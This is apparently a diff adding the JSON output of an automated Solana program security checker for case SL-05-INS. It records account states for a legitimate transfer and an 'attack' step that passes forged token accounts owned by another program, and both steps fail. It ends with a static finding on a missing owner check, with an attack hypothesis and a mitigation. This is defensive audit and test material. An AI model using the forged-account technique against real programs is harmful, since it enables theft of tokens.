+                "post": "00000000000000040000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000e803000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111113R2cuenjG5nFubqX9Wzuukdin2YfGQVzu5",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "cfe07edda73017e4",
+                "post": "000000000000000400000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 82,
+                "head": "00000000e8030000",
+                "digest": "201bbca1a69b5a99",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "CPI com contas forjadas de dono diferente",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3651,
+            "account_flags": "-w,-w,sr,-r,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "11111113pNDtm61yGF8j2ycAwLEPsuWQXobye5qDR",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "ed5a61a324ab1726",
+                "post": "00000000000000040000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000e803000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111114DhpssPJgSi1YU7hCMfYt1BJ334YgsffXm",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 165,
+                "head": "0000000000000004",
+                "digest": "cfe07edda73017e4",
+                "post": "000000000000000400000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 82,
+                "head": "00000000e8030000",
+                "digest": "201bbca1a69b5a99",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3651 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3651 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction"
+        ],
+        "elapsed_s": 1.9
+      },
+      "verdict": null,
+      "reason": "o baseline 'transferencia legitima via CPI' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    }
+  ],
+  "case_id": "SL-05-INS",
+  "static_finding": {
+    "category": "OWNER",
+    "confidence": "medium",
+    "evidence": "source: AccountInfo<'info>,\ndestination: AccountInfo<'info>,\nauthority: AccountInfo<'info>,",
+    "explanation": "As contas `source`, `destination` e `authority` sao recebidas como `AccountInfo` genericas sem verificar que pertencem ao programa SPL Token (`account.owner == spl_token::ID`). O programa assume que sao contas de token validas sem checar o proprietario.",
+    "attack_hypothesis": "O atacante fornece contas `source`/`destination` que nao pertencem ao SPL Token (ex: contas de outro programa com layout forjado). Como o proprietario nao e validado, a CPI pode operar sobre dados inesperados ou o programa pode ser induzido a aceitar contas invalidas.",
+    "mitigation": "Usar `Account<'info, TokenAccount>` do Anchor (que valida o owner) ou verificar explicitamente `ctx.accounts.source.owner == spl_token::ID`."
+  }
+}
